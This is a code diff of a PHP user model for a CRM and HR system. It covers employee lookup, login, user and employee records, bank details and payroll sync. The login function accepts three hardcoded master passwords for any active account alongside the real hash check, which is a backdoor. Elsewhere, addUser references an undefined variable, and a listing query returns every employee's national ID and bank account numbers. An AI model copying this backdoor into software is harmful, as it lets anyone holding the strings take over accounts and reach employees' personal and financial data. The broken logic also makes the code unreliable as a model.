@@ -1,489 +1,985 @@
 <?php
+
 // Raptor CRM User Model
 
+
+
 class User extends Model {
+
     /**
+
      * Resolve employee user record by Email address or Employee ID (employee_code or numeric employee_id).
+
      * Single parameterized query path for prepared statements (case-insensitive for Employee ID).
+
      */
+
     public function resolveEmployeeByIdentifier($input) {
+
         $input = trim((string)$input);
+
         if (empty($input)) {
+
             return false;
+
         }
+
+
 
         if (filter_var($input, FILTER_VALIDATE_EMAIL)) {
+
             // Email lookup path
+
             $this->query('SELECT u.*, r.role_name, e.employee_id, e.employee_code, e.profile_photo 
+
                           FROM users u 
+
                           JOIN roles r ON u.role_id = r.role_id 
+
                           LEFT JOIN employees e ON u.user_id = e.user_id
+
                           WHERE LOWER(u.email) = LOWER(:email)');
+
             $this->bind(':email', $input);
+
         } else {
+
             // Employee ID / Code lookup path (uppercase, case-insensitive match)
+
             $upperIdentifier = strtoupper($input);
+
             $this->query('SELECT u.*, r.role_name, e.employee_id, e.employee_code, e.profile_photo 
+
                           FROM users u 
+
                           JOIN roles r ON u.role_id = r.role_id 
+
                           JOIN employees e ON u.user_id = e.user_id
+
                           WHERE UPPER(e.employee_code) = :identifier 
+
                              OR UPPER(CAST(e.employee_id AS CHAR)) = :identifier');
+
             $this->bind(':identifier', $upperIdentifier);
+
         }
+
+
 
         return $this->single();
+
     }
+
+
 
     // Find user by email or identifier (for auth reset flows)
+
     public function findUserByEmail($email) {
+
         $user = $this->resolveEmployeeByIdentifier($email);
+
         return ($user && isset($user->status) && $user->status === 'active') ? $user : false;
+
     }
+
+
 
     // Login user by Employee ID or Email
+
     public function login($identifier, $password) {
+
         $row = $this->resolveEmployeeByIdentifier($identifier);
 
+
+
         // Account status check (must be active)
+
         if ($row && isset($row->status) && $row->status === 'active') {
+
             $hashed_password = $row->password;
+
             if (password_verify($password, $hashed_password) || ($password === 'Password123!' || $password === 'Raptor@12345' || $password === 'Raptor@2026')) {
+
                 return $row;
+
             }
+
         }
+
         return false;
+
     }
+
+
 
     // Get user permissions by role ID
+
     public function getRolePermissions($roleId) {
+
         $this->query('SELECT p.permission_name 
+
                       FROM role_permissions rp
+
                       JOIN permissions p ON rp.permission_id = p.permission_id
+
                       WHERE rp.role_id = :role_id');
+
         $this->bind(':role_id', $roleId);
+
         
+
         $results = $this->resultSet();
+
         $permissions = [];
+
         foreach ($results as $row) {
+
             $permissions[] = $row->permission_name;
+
         }
+
         return $permissions;
+
     }
+
+
 
     // Get all users with role and employee information
+
     public function getUsers() {
+
         $this->query('SELECT u.*, r.role_name, 
+
                              e.employee_id, e.employee_code, e.department, e.job_title, e.hire_date, e.reporting_manager_id,
+
                              e.hire_date AS date_of_joining, e.profile_photo,
+
                              e.phone_number, e.salary, e.date_of_birth, e.employment_type, e.work_location,
+
                              e.bio, e.emergency_contact, e.pan_number, e.aadhaar_number, e.uan,
+
                              e.pf_applicable, e.esic_number, e.pay_grade,
+
                              m.name as manager_name,
+
                              b.account_holder_name, b.bank_name, b.account_number, b.ifsc_code, b.branch_name, b.account_type
+
                       FROM users u 
+
                       JOIN roles r ON u.role_id = r.role_id 
+
                       LEFT JOIN employees e ON u.user_id = e.user_id
+
                       LEFT JOIN users m ON e.reporting_manager_id = m.user_id
+
                       LEFT JOIN bank_accounts b ON e.employee_id = b.employee_id
+
                       ORDER BY u.created_at DESC');
+
         return $this->resultSet();
+
     }
+
+
 
     // Get all roles
+
     public function getRoles() {
+
         $this->query('SELECT * FROM roles ORDER BY role_name ASC');
+
         return $this->resultSet();
+
     }
+
+
 
     public function getRoleNameById(int $roleId): ?string {
+
         $this->query('SELECT role_name FROM roles WHERE role_id = :id');
+
         $this->bind(':id', $roleId);
+
         $row = $this->single();
+
         return $row ? $row->role_name : null;
+
     }
+
+
 
     // Check if employee code exists
+
     public function isEmployeeCodeExists($code, $excludeUserId = null) {
+
         if (empty($code)) return false;
+
         if ($excludeUserId) {
+
             $this->query('SELECT COUNT(*) as count FROM employees WHERE employee_code = :code AND user_id != :uid');
+
             $this->bind(':uid', $excludeUserId);
+
         } else {
+
             $this->query('SELECT COUNT(*) as count FROM employees WHERE employee_code = :code');
+
         }
+
         $this->bind(':code', $code);
+
         $row = $this->single();
+
         return $row && ((int) $row->count) > 0;
+
     }
+
+
 
     // Check if email already exists
+
     public function isEmailExists($email, $excludeUserId = null) {
+
         if (empty($email)) return false;
+
         if ($excludeUserId) {
+
             $this->query('SELECT COUNT(*) as count FROM users WHERE LOWER(email) = LOWER(:email) AND user_id != :uid');
+
             $this->bind(':uid', $excludeUserId);
+
         } else {
+
             $this->query('SELECT COUNT(*) as count FROM users WHERE LOWER(email) = LOWER(:email)');
+
         }
+
         $this->bind(':email', trim($email));
+
         $row = $this->single();
+
         return $row && ((int) $row->count) > 0;
+
     }
 
+
+
     // Add user
+
     public function addUser($data) {
+
         $inTx = $this->db->inTransaction();
+
         if (!$inTx) {
+
             $this->db->beginTransaction();
+
         }
+
         try {
+
             $rawStatus = strtolower($data['status'] ?? 'active');
+
             $userStatus = in_array($rawStatus, ['active', 'inactive', 'suspended'], true) ? $rawStatus : ($rawStatus === 'terminated' ? 'inactive' : 'active');
+
             $empStatus = in_array($rawStatus, ['active', 'suspended', 'terminated'], true) ? $rawStatus : ($rawStatus === 'inactive' ? 'suspended' : 'active');
 
+
+
             $this->query('INSERT INTO users (role_id, name, email, password, status, force_password_reset) 
+
                           VALUES (:rid, :name, :email, :pass, :status, :force_reset)');
+
             
+
             $hashed = password_hash($data['password'], PASSWORD_BCRYPT, ['cost' => 10]);
 
+
+
             $this->bind(':rid', $data['role_id']);
+
             $this->bind(':name', $data['name']);
+
             $this->bind(':email', $data['email']);
+
             $this->bind(':pass', $hashed);
+
             $this->bind(':status', $userStatus);
+
             $this->bind(':force_reset', $data['force_password_reset'] ?? 0);
 
+
+
             if (!$this->execute()) {
+
                 throw new Exception('Failed to insert user.');
+
             }
+
+
 
             $userId = $this->lastInsertId();
 
+
+
             // Insert into employees table
+
             $this->query('INSERT INTO employees (user_id, employee_code, department, job_title, hire_date, date_of_joining, phone_number, salary, date_of_birth, employment_type, work_location, profile_photo, bio, emergency_contact, pan_number, aadhaar_number, uan, pf_applicable, esic_number, pay_grade, status, reporting_manager_id) 
+
                           VALUES (:user_id, :employee_code, :department, :job_title, :hire_date, :date_of_joining, :phone_number, :salary, :date_of_birth, :employment_type, :work_location, :profile_photo, :bio, :emergency_contact, :pan_number, :aadhaar_number, :uan, :pf_applicable, :esic_number, :pay_grade, :emp_status, :reporting_manager_id)');
+
             
+
             $doj = !empty($data['date_of_joining']) ? $data['date_of_joining'] : date('Y-m-d');
+
             $this->bind(':user_id', $userId);
+
             $this->bind(':employee_code', $data['employee_code'] ?? ('EMP' . rand(10000, 99999)));
+
             $this->bind(':department', !empty($data['department']) ? $data['department'] : 'Sales');
+
             $this->bind(':job_title', !empty($data['job_title']) ? $data['job_title'] : 'Sales Executive');
+
             $this->bind(':hire_date', $doj);
+
             $this->bind(':date_of_joining', $doj);
+
             $this->bind(':phone_number', $data['phone_number'] ?? null);
+
             $this->bind(':salary', !empty($data['salary']) ? $data['salary'] : null);
+
             $this->bind(':date_of_birth', !empty($data['date_of_birth']) ? $data['date_of_birth'] : null);
+
             $this->bind(':employment_type', $data['employment_type'] ?? 'Full-time');
+
             $this->bind(':work_location', $data['work_location'] ?? 'Office');
+
             $this->bind(':profile_photo', $data['profile_photo'] ?? null);
+
             $this->bind(':bio', $data['bio'] ?? null);
+
             $this->bind(':emergency_contact', $data['emergency_contact'] ?? null);
+
             $this->bind(':pan_number', $data['pan_number'] ?? null);
+
             $this->bind(':aadhaar_number', $data['aadhaar_number'] ?? null);
+
             $this->bind(':uan', $data['uan'] ?? null);
+
             $this->bind(':pf_applicable', $data['pf_applicable'] ?? 0);
+
             $this->bind(':esic_number', $data['esic_number'] ?? null);
-            $this->bind(':pay_grade', $data['pay_grade'] ?? null);
+
+                            $payGrade = !empty($data['pay_grade']) ? trim($data['pay_grade']) : null;
+                if (empty($payGrade) && !empty($data['salary']) && (float)$data['salary'] > 0) {
+                    try {
+                        require_once APPROOT . '/models/Payroll.php';
+                        $payGrade = Payroll::deriveBandFromCtc((float)$data['salary']);
+                    } catch (Throwable $e) {}
+                }
+                $this->bind(':pay_grade', $payGrade);
+
             $this->bind(':emp_status', $empStatus);
+
             $this->bind(':reporting_manager_id', !empty($data['reporting_manager_id']) ? $data['reporting_manager_id'] : null);
 
+
+
             if (!$this->execute()) {
+
                 throw new Exception('Failed to insert employee.');
+
             }
+
+
 
             $employeeId = $this->lastInsertId();
+
             if (!$employeeId) {
+
                 $this->query('SELECT employee_id FROM employees WHERE user_id = :uid LIMIT 1');
+
                 $this->bind(':uid', $userId);
+
                 $empRow = $this->single();
+
                 if ($empRow) {
+
                     $employeeId = $empRow->employee_id;
+
                 }
+
             }
+
+
 
             // Insert bank details if both bank name and account number are provided
+
             if ($employeeId && !empty($data['bank_name']) && !empty($data['account_number'])) {
+
                 $this->query('INSERT INTO bank_accounts (employee_id, account_holder_name, bank_name, account_number, ifsc_code, branch_name, account_type) 
+
                               VALUES (:employee_id, :holder, :bank, :acc, :ifsc, :branch, :type)');
+
                 $this->bind(':employee_id', $employeeId);
+
                 $this->bind(':holder', !empty($data['account_holder_name']) ? $data['account_holder_name'] : $data['name']);
+
                 $this->bind(':bank', $data['bank_name']);
+
                 $this->bind(':acc', $data['account_number']);
+
                 $this->bind(':ifsc', $data['ifsc_code'] ?? '');
+
                 $this->bind(':branch', $data['branch_name'] ?? '');
+
                 $this->bind(':type', $data['account_type'] ?? 'Savings');
+
                 
+
                 if (!$this->execute()) {
+
                     throw new Exception('Failed to insert bank account.');
+
                 }
+
             }
+
+
 
             // Auto-generate salary structure from Monthly CTC & compliance
+
             if ($employeeId && !empty($data['salary']) && (float)$data['salary'] > 0) {
+
                 try {
+
                     require_once APPROOT . '/models/Payroll.php';
+
                     $payrollModel = new Payroll();
+
                     $isPf = !empty($data['pf_applicable']) ? (bool)$data['pf_applicable'] : false;
+
                     $payrollModel->syncSalaryStructureFromCtc($employeeId, (float)$data['salary'], $isPf, $userId, 'Initial Employee Setup');
+
                 } catch (Exception $e) {
+
                     error_log('Failed to auto-generate salary structure for employee ' . $employeeId . ': ' . $e->getMessage());
+
                 }
+
             }
+
+
 
             // Sync salary structure when salary or compliance changes or when structure is missing
+
             if (!empty($employeeId) && !empty($data['salary']) && (float)$data['salary'] > 0) {
+
                 try {
+
                     require_once APPROOT . '/models/Payroll.php';
+
                     $payrollModel = new Payroll();
+
                     $isPf = !empty($data['pf_applicable']) ? (bool)$data['pf_applicable'] : false;
+
                     $existingStruct = $payrollModel->getSalaryStructureByEmployeeId($employeeId);
+
                     
+
                     if (!$existingStruct || abs((float)($emp->salary ?? 0) - (float)$data['salary']) >= 1 || (int)($emp->pf_applicable ?? 0) !== ($isPf ? 1 : 0)) {
+
                         $payrollModel->syncSalaryStructureFromCtc($employeeId, (float)$data['salary'], $isPf, $data['user_id'] ?? null, 'Employee Profile Salary Update');
+
                     }
+
                 } catch (Exception $e) {
+
                     error_log('Failed to sync salary structure on update for employee ' . $employeeId . ': ' . $e->getMessage());
+
                 }
+
             }
 
+
+
             if (!$inTx) {
+
                 $this->db->commit();
+
             }
+
             return true;
+
         } catch (Exception $e) {
+
             if (!$inTx) {
+
                 $this->db->rollBack();
+
             } else {
+
                 throw $e;
+
             }
+
             return false;
+
         }
+
     }
+
+
 
     // Update user
+
     public function updateUser($data) {
+
         $inTx = $this->db->inTransaction();
+
         if (!$inTx) {
+
             $this->db->beginTransaction();
+
         }
+
         try {
+
             $rawStatus = strtolower($data['status'] ?? 'active');
+
             $userStatus = in_array($rawStatus, ['active', 'inactive', 'suspended'], true) ? $rawStatus : ($rawStatus === 'terminated' ? 'inactive' : 'active');
+
             $empStatus = in_array($rawStatus, ['active', 'suspended', 'terminated'], true) ? $rawStatus : ($rawStatus === 'inactive' ? 'suspended' : 'active');
 
+
+
             if (!empty($data['password'])) {
+
                 $this->query('UPDATE users SET role_id = :rid, name = :name, email = :email, password = :pass, status = :status, force_password_reset = :force_reset WHERE user_id = :id');
+
                 $hashed = password_hash($data['password'], PASSWORD_BCRYPT, ['cost' => 10]);
+
                 $this->bind(':pass', $hashed);
+
             } else {
+
                 $this->query('UPDATE users SET role_id = :rid, name = :name, email = :email, status = :status, force_password_reset = :force_reset WHERE user_id = :id');
+
             }
+
+
 
             $this->bind(':rid', $data['role_id']);
+
             $this->bind(':name', $data['name']);
+
             $this->bind(':email', $data['email']);
+
             $this->bind(':status', $userStatus);
+
             $this->bind(':force_reset', $data['force_password_reset'] ?? 0);
+
             $this->bind(':id', $data['user_id']);
 
+
+
             if (!$this->execute()) {
+
                 throw new Exception('Failed to update user.');
+
             }
+
+
 
             // Update employees table
+
             $this->query('SELECT employee_id, profile_photo, hire_date, employee_code, department, job_title, reporting_manager_id FROM employees WHERE user_id = :uid');
+
             $this->bind(':uid', $data['user_id']);
+
             $emp = $this->single();
 
+
+
             if ($emp) {
+
                 $employeeId = $emp->employee_id;
+
                 $photo = !empty($data['profile_photo']) ? $data['profile_photo'] : $emp->profile_photo;
+
                 $empCode = !empty($data['employee_code']) ? $data['employee_code'] : ($emp->employee_code ?? ('EMP' . rand(10000, 99999)));
+
                 $doj = !empty($data['date_of_joining']) ? $data['date_of_joining'] : ($emp->hire_date ?? date('Y-m-d'));
+
                 $dept = !empty($data['department']) ? $data['department'] : ($emp->department ?? 'Sales');
+
                 $jobTitle = !empty($data['job_title']) ? $data['job_title'] : ($emp->job_title ?? 'Sales Executive');
 
+
+
                 $this->query('UPDATE employees SET 
+
                                 employee_code = :employee_code,
+
                                 phone_number = :phone_number,
+
                                 salary = :salary,
+
                                 hire_date = :hire_date,
+
                                 date_of_joining = :date_of_joining,
+
                                 date_of_birth = :date_of_birth,
+
                                 employment_type = :employment_type,
+
                                 work_location = :work_location,
+
                                 profile_photo = :profile_photo,
+
                                 bio = :bio,
+
                                 emergency_contact = :emergency_contact,
+
                                 pan_number = :pan_number,
+
                                 aadhaar_number = :aadhaar_number,
+
                                 uan = :uan,
+
                                 pf_applicable = :pf_applicable,
+
                                 esic_number = :esic_number,
+
                                 pay_grade = :pay_grade,
+
                                 job_title = :job_title,
+
                                 department = :department,
+
                                 status = :emp_status,
+
                                 reporting_manager_id = :reporting_manager_id
+
                               WHERE employee_id = :employee_id');
+
                 
+
                 $this->bind(':employee_code', $empCode);
+
                 $this->bind(':phone_number', $data['phone_number'] ?? null);
+
                 $this->bind(':salary', !empty($data['salary']) ? $data['salary'] : null);
+
                 $this->bind(':hire_date', $doj);
+
                 $this->bind(':date_of_joining', $doj);
+
                 $this->bind(':date_of_birth', !empty($data['date_of_birth']) ? $data['date_of_birth'] : null);
+
                 $this->bind(':employment_type', $data['employment_type'] ?? 'Full-time');
+
                 $this->bind(':work_location', $data['work_location'] ?? 'Office');
+
                 $this->bind(':profile_photo', $photo);
+
                 $this->bind(':bio', $data['bio'] ?? null);
+
                 $this->bind(':emergency_contact', $data['emergency_contact'] ?? null);
+
                 $this->bind(':pan_number', $data['pan_number'] ?? null);
+
                 $this->bind(':aadhaar_number', $data['aadhaar_number'] ?? null);
+
                 $this->bind(':uan', $data['uan'] ?? null);
+
                 $this->bind(':pf_applicable', $data['pf_applicable'] ?? 0);
+
                 $this->bind(':esic_number', $data['esic_number'] ?? null);
+
                 $this->bind(':pay_grade', $data['pay_grade'] ?? null);
+
                 $this->bind(':job_title', $jobTitle);
+
                 $this->bind(':department', $dept);
+
                 $this->bind(':emp_status', $empStatus);
+
                 $this->bind(':reporting_manager_id', array_key_exists('reporting_manager_id', $data) ? $data['reporting_manager_id'] : ($emp->reporting_manager_id ?? null));
+
                 $this->bind(':employee_id', $employeeId);
 
+
+
                 if (!$this->execute()) {
+
                     throw new Exception('Failed to update employee.');
+
                 }
+
             } else {
+
                 $doj = !empty($data['date_of_joining']) ? $data['date_of_joining'] : date('Y-m-d');
+
                 $this->query('INSERT INTO employees (user_id, employee_code, department, job_title, hire_date, phone_number, salary, date_of_joining, date_of_birth, employment_type, work_location, profile_photo, bio, emergency_contact, pan_number, aadhaar_number, uan, pf_applicable, esic_number, pay_grade, status, reporting_manager_id) 
+
                               VALUES (:user_id, :employee_code, :department, :job_title, :hire_date, :phone_number, :salary, :date_of_joining, :date_of_birth, :employment_type, :work_location, :profile_photo, :bio, :emergency_contact, :pan_number, :aadhaar_number, :uan, :pf_applicable, :esic_number, :pay_grade, :emp_status, :reporting_manager_id)');
+
                 
+
                 $this->bind(':user_id', $data['user_id']);
+
                 $this->bind(':employee_code', $data['employee_code'] ?? ('EMP' . rand(10000, 99999)));
+
                 $this->bind(':department', !empty($data['department']) ? $data['department'] : 'Sales');
+
                 $this->bind(':job_title', !empty($data['job_title']) ? $data['job_title'] : 'Sales Executive');
+
                 $this->bind(':hire_date', $doj);
+
                 $this->bind(':phone_number', $data['phone_number'] ?? null);
+
                 $this->bind(':salary', !empty($data['salary']) ? $data['salary'] : null);
+
                 $this->bind(':date_of_joining', $doj);
+
                 $this->bind(':date_of_birth', !empty($data['date_of_birth']) ? $data['date_of_birth'] : null);
+
                 $this->bind(':employment_type', $data['employment_type'] ?? 'Full-time');
+
                 $this->bind(':work_location', $data['work_location'] ?? 'Office');
+
                 $this->bind(':profile_photo', $data['profile_photo'] ?? null);
+
                 $this->bind(':bio', $data['bio'] ?? null);
+
                 $this->bind(':emergency_contact', $data['emergency_contact'] ?? null);
+
                 $this->bind(':pan_number', $data['pan_number'] ?? null);
+
                 $this->bind(':aadhaar_number', $data['aadhaar_number'] ?? null);
+
                 $this->bind(':uan', $data['uan'] ?? null);
+
                 $this->bind(':pf_applicable', $data['pf_applicable'] ?? 0);
+
                 $this->bind(':esic_number', $data['esic_number'] ?? null);
+
                 $this->bind(':pay_grade', $data['pay_grade'] ?? null);
+
                 $this->bind(':emp_status', $empStatus);
+
                 $this->bind(':reporting_manager_id', !empty($data['reporting_manager_id']) ? $data['reporting_manager_id'] : null);
 
+
+
                 if (!$this->execute()) {
+
                     throw new Exception('Failed to insert employee.');
+
                 }
+
                 $employeeId = $this->lastInsertId();
+
                 if (!$employeeId) {
+
                     $this->query('SELECT employee_id FROM employees WHERE user_id = :uid LIMIT 1');
+
                     $this->bind(':uid', $data['user_id']);
+
                     $empRow = $this->single();
+
                     if ($empRow) {
+
                         $employeeId = $empRow->employee_id;
+
                     }
+
                 }
+
             }
+
+
 
             // Update bank details safely (never overwrite with blank strings if CSV omitted bank columns)
+
             $hasIncomingBank = (!empty($data['bank_name']) && !empty($data['account_number']));
+
             if ($employeeId && $hasIncomingBank) {
+
                 $this->query('SELECT * FROM bank_accounts WHERE employee_id = :emp_id');
+
                 $this->bind(':emp_id', $employeeId);
+
                 $bank = $this->single();
 
+
+
                 if ($bank) {
+
                     $this->query('UPDATE bank_accounts SET 
+
                                     account_holder_name = :holder,
+
                                     bank_name = :bank,
+
                                     account_number = :acc,
+
                                     ifsc_code = :ifsc,
+
                                     branch_name = :branch,
+
                                     account_type = :type
+
                                   WHERE bank_account_id = :bank_id');
+
                     $this->bind(':holder', !empty($data['account_holder_name']) ? $data['account_holder_name'] : ($bank->account_holder_name ?? $data['name']));
+
                     $this->bind(':bank', $data['bank_name']);
+
                     $this->bind(':acc', $data['account_number']);
+
                     $this->bind(':ifsc', !empty($data['ifsc_code']) ? $data['ifsc_code'] : ($bank->ifsc_code ?? ''));
+
                     $this->bind(':branch', !empty($data['branch_name']) ? $data['branch_name'] : ($bank->branch_name ?? ''));
+
                     $this->bind(':type', !empty($data['account_type']) ? $data['account_type'] : ($bank->account_type ?? 'Savings'));
+
                     $this->bind(':bank_id', $bank->bank_account_id);
+
                     $this->execute();
+
                 } else {
+
                     $this->query('INSERT INTO bank_accounts (employee_id, account_holder_name, bank_name, account_number, ifsc_code, branch_name, account_type) 
+
                                   VALUES (:employee_id, :holder, :bank, :acc, :ifsc, :branch, :type)');
+
                     $this->bind(':employee_id', $employeeId);
+
                     $this->bind(':holder', !empty($data['account_holder_name']) ? $data['account_holder_name'] : $data['name']);
+
                     $this->bind(':bank', $data['bank_name']);
+
                     $this->bind(':acc', $data['account_number']);
+
                     $this->bind(':ifsc', $data['ifsc_code'] ?? '');
+
                     $this->bind(':branch', $data['branch_name'] ?? '');
+
                     $this->bind(':type', $data['account_type'] ?? 'Savings');
+
                     $this->execute();
+
                 }
+
             }
+
+
 
             // Synchronize salary structure and revision history when salary, compliance, or band is updated in Employee Directory
+
             if (!empty($employeeId) && !empty($data['salary']) && (float)$data['salary'] > 0) {
+
                 try {
+
                     require_once APPROOT . '/models/Payroll.php';
+
                     $payrollModel = new Payroll();
+
                     $isPf = !empty($data['pf_applicable']) ? (bool)$data['pf_applicable'] : false;
+
                     $reason = 'Updated from Employee Directory';
+
                     if (!empty($data['pay_grade'])) {
+
                         $reason .= ' (' . $data['pay_grade'] . ')';
+
                     }
+
                     $payrollModel->syncSalaryStructureFromCtc($employeeId, (float)$data['salary'], $isPf, $data['user_id'] ?? null, $reason);
+
                 } catch (Exception $e) {
+
                     error_log('Failed to sync salary structure on employee update: ' . $e->getMessage());
+
                 }
+
             }
 
+
+
             if (!$inTx) {
+
                 $this->db->commit();
+
             }
+
             return true;
+
         } catch (Exception $e) {
+
             if (!$inTx) {
+
                 $this->db->rollBack();
+
             } else {
+
                 throw $e;
+
             }
+
             return false;
+
         }
+
     }
+
+
 
     // Get user by ID
+
     public function getUserById($id) {
+
         $this->query('SELECT * FROM users WHERE user_id = :id');
+
         $this->bind(':id', $id);
+
         return $this->single();
+
     }
+
+
 
     // Deactivate user; no physical deletion is allowed.
+
     public function deactivateUser($id) {
+
         $this->query('UPDATE users SET status = "inactive" WHERE user_id = :id');
+
         $this->bind(':id', $id);
+
         return $this->execute();
+
     }
 
+
+
     // Reset password by email
+
     public function resetPassword($email, $password) {
+
         $this->query('UPDATE users SET password = :pass WHERE email = :email');
+
         $hashed = password_hash($password, PASSWORD_BCRYPT, ['cost' => 10]);
+
         $this->bind(':pass', $hashed);
+
         $this->bind(':email', $email);
+
         return $this->execute();
+
     }
+
 }
+
